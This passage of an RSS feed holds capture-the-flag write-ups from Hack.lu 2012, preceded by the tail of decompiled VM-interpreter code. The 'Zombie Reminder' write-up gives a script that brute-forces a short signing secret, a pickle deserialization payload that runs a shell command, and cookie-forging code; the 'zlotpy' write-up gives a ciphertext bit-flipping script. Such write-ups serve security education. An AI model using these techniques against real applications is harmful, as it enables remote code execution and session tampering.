        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = (_WORD)PC + 2 - (_WORD)PC;
        PC += (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        break;
      case 0x25:
        v61 -= v66;
        break;
      case 0x24:
        v65 = (_WORD)heap1_end2 - (_WORD)PC;
        break;
      case 0x21:
        v61 = *(_WORD *)&amp;PC[v66];
        break;
      case 0x20:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
        {
terminate_:
          put_("VM PROTECTION FAIL, TERMINATING");
          exit_(1);
        }
        --heap1_end2;
        *heap1_end2 = v61;
        break;
      case 0x17:
        v53 = *PC;
        v54 = v4;
        ++PC;
        BYTE1(v54) |= 0x40u;
        BYTE1(v4) &amp;= 0xBFu;
        if ( v53 )
          v4 = v54;
        break;
      case 0x16:
        v55 = PC[1];
        v56 = *PC;
        PC += 2;
        v66 -= (v55 &lt;&lt; 8) | v56;
        break;
      case 0x14:
        --heap1_end2;
        *heap1_end2 = v4;
        break;
      case 0xD:
        v57 = *PC++;
        v58 = v4 | 0x10;
        v4 &amp;= 0xFFFFFFEFu;
        if ( v57 )
          v4 = v58;
        break;
      case 0xA:
        v59 = v4 &amp; 0x1FFF;
        if ( v61 == v66 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v66 = v61;
        }
        else
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v59) |= 0x40u;
          LOWORD(v4) = v4 | 0x8000;
          if ( v66 &lt;= v61 )
            v4 = v59;
        }
        break;
      case 0xFF:
        return 0;
    }
  }
}
</pre>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 &#8211; Challenge #19 &#8211; Zombie Reminder &#8211; (200)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-19-zombie-reminder-200.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-19-zombie-reminder-200.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>19 – Zombie Reminder<br />
Zombies love brains. But zombies forget, so they have a tool where they can enter the location of brains they found. In a heroic mission someone managed to obtain both the source code and the information that a critical file can be found at ‘/var/www/flag’.<br />
Your mission is to obtain the contents of this file by any means and avenge your fallen friend!<br />
Service: https://ctf.fluxfingers.net:2073/<br />
Source: https://ctf.fluxfingers.net/challenges/zombie_reminder.py</p>
</blockquote>

<p>This challenge is a web application returning an arbitrary text that inputed by you previously. Your input is stored in “location” cookie with format of “<strong>&lt;hash_digest&gt;!&lt;encoded_input&gt;</strong>” where:</p>

<ul>
  <li>encoded_input = base64_encode(pickle.dumps(your_input))</li>
  <li>hash_digest = sha256(encoded_input+secret_key)</li>
</ul>

<p>When you go back to the main page, if a valid cookie is set the application will load the pickle object from cookie and print it out.&lt;/p&gt; &lt;pre class="brush: plain; title: ; notranslate" title=""&gt;location = pickle.loads(b64d(location))
&lt;/pre&gt;</p>

<p>The purpose of hash_digest is to ensure that your_input is a <strong>string</strong> submitted through challenge’s web form. However this design has 2 major flaws:</p>

<ul>
  <li>secret_key is too short (5 characters)</li>
  <li>pickle has a known security issue (<a href="http://nadiana.com/python-pickle-insecure">http://nadiana.com/python-pickle-insecure</a>)</li>
</ul>

<p>We submit a random string (let’s say “test”) and look at the cookie:<br />
location=”04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37!VnRlc3QKcDAKLg==”</p>

<p>We use this script to bruteforce the secret key :</p>

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python

import multiprocessing
from hashlib import *
import string
import sys

s = string.ascii_letters + string.digits
location = "VnRlc3QKcDAKLg=="
digest = "04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37"

print len(s)

WORKERS    = 8

def worker(start,end):

    for i1 in s[start:end]:
        for i2 in s:
            for i3 in s:
                for i4 in s:
                    for i5 in s:
                        secret  = i1+i2+i3+i4+i5

                        if sha256("%s%s" % (location, secret)).hexdigest() == digest:
                            print "*******", secret
                            sys.exit(0)

def main():

    ps = []
    for i in range(WORKERS):
        if i == WORKERS -1:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),len(s),))
        else:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),(i+1)*(len(s)/WORKERS),))
        tmp.start()
        ps.append(tmp)

    for p in ps:
        p.join()

    return jobs.empty()

if __name__ == '__main__':
    main()
</pre>

<p>After a few minutes we managed to find the key <strong>oIqxe</strong>. Our next task is to build a pickled representation of a python code object, the goal is to execute a code similar to this when pickle.loads() is called:</p>

<pre class="brush: plain; title: ; notranslate" title="">__import__("commands").getoutput("cat /var/www/flag")
</pre>

<p>This code is used to generate such serialized string:</p>

<pre class="brush: plain; title: ; notranslate" title="">import pickle, new

def nasty(module, function, *args):
        return pickle.dumps(new.classobj(function, (), {'__getinitargs__': lambda self, arg = args: arg, '__module__': module}) ())

t = nasty("commands", "getoutput", "cat /var/www/flag")

print repr(t)

# Output: "(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb."
</pre>

<p>Now we have everything to get the flag, time to build a valid cookie:</p>

<pre class="brush: plain; title: ; notranslate" title="">from hashlib import sha256
import base64
b64e=base64.b64encode

secret = 'oIqxe'
location = b64e("(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb.")

cookie = "%s!%s" % (sha256("%s%s" % (location, secret)).hexdigest(), location)

print cookie
</pre>

<p>Place this cookie into your browser (don’t ask us how to do that lolz) and refresh, the flag will be right on the screen.</p>

<blockquote>
  <p>Hello, here is what we remember for you. If you want to change, delete or extend it, click below<br />
08ac40047dae3f6a36471d768dfcb1b7a8e18fb8</p>
</blockquote>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 &#8211; Challenge #10 (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-10-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-10-500.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>10 – zlotpy<br />
Gambling time. Play against the Internet Zlot Machine at ctf.fluxfingers.net tcp/2053 This challenge has two stages.</p>

  <p>1) Medium: Investigate the contents of a saved game.</p>

  <p>2) Hard: Get 8 (EIGHT) bonus points. Good luck! Hint: We have some sourcecode for you! https://ctf.fluxfingers.net/challenges/zlot.py</p>
</blockquote>

<p>At the first sight, we thought this challenge was about Padding Oracle, but it turned out that Bit Flipping attack should be enough to solve.<br />
First step is to send ‘S’ and get back the ciphertext representing current game state</p>

<blockquote>
  <p>Welcome to the Internet ZlotMachine. Enter ‘T’ for the Tutorial.<br />
Your current balance is 5 credits and 1 bonus<br />
S<br />
Your games has been saved! Please write down the following save game code.<br />
WVIagr4eWOGCHi/CSQg1oKEgZneHnJJIm5LJjJeacngsTG1hm9jfygT6ZpBrsFihNKoef165OP2pb+tacn+9FlV+CfKjelFHS4MykxpJcYk=<br />
This game may later be loaded with L</p>
</blockquote>

<p>If we send this cipher back to the server, it will return <strong>“Your current balance is 5 credits and 1 bonus”</strong></p>

<p>The code below will loop throuth each byte of the cipher text, increase the value by one and ask the server to load that newly created gamestate.</p>

<pre class="brush: python; title: ; notranslate" title="">s = socket(AF_INET, SOCK_STREAM)
s.connect(("ctf.fluxfingers.net",2053))
s.recv(1024)&lt;/code&gt;

responses = set()

def send_request(data):
    try:
        s.send("L"+data+"n")
    except:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("ctf.fluxfingers.net",2053))
        s.recv(1024)
        s.send("L"+data+"n")&lt;/code&gt;

    r = s.recv(1024)

    if r not in responses:
        responses.add(r)
        print r

orig_cipher = base64.b64decode("mzIbwjPTw6hMVcp5DsRZGJykuaWXYaukFOEvUT5xVFLfjqQahbCTNsjXYYUawNEc+XFBV689Y/LPD8YYqKy+Z4DqS1uh9yva1ICjyphYbC8=")
fake_cipher = orig_cipher
l = len(orig_cipher)
for i in range(l):
    print "Try with character #%d"%i
    fake_cipher = set_byte(orig_cipher, i, chr((ord(fake_cipher[i])+1)%256) )
    send_request(base64.b64encode(fake_cipher))
</pre>

<p>The response will look like this:</p>

<blockquote>
  <p>Try with character #9<br />
Try with character #10<br />
Restored state.<br />
Your current balance is 5 credits and 0 bonus</p>

  <p>Try with character #11<br />
Error loading game: Expecting , delimiter: line 1 column 11 (char 11)</p>
</blockquote>

<p>Looking at the result, we notice that changing value of byte #10 will cause the bonus value changed.<br />
Now we simply brute the value of this byte until getting the flag:</p>

<pre class="brush: python; title: ; notranslate" title="">orig_cipher = base64.b64decode("mzIbwjPTw6hMVcp5DsRZGJykuaWXYaukFOEvUT5xVFLfjqQahbCTNsjXYYUawNEc+XFBV689Y/LPD8YYqKy+Z4DqS1uh9yva1ICjyphYbC8=")
fake_cipher = orig_cipher
l = len(orig_cipher)
for i in range(256):
    index = 10
    fake_cipher = set_byte(fake_cipher, index, chr((ord(fake_cipher[index])+i)%256) )
    send_request(base64.b64encode(fake_cipher))
</pre>

<p>We will see the flag after a few minutes:</p>

<blockquote>
  <p>Restored state.<br />
Your current balance is 5 credits and 5 bonus</p>

  <p>Restored state.<br />
Your current balance is 5 credits and 8 bonus<br />
Nice one. Here’s your flag: 9eef8f17d07c4f11febcac1052469ab9</p>
</blockquote>

  ]]></description>
</item>

</channel>
</rss>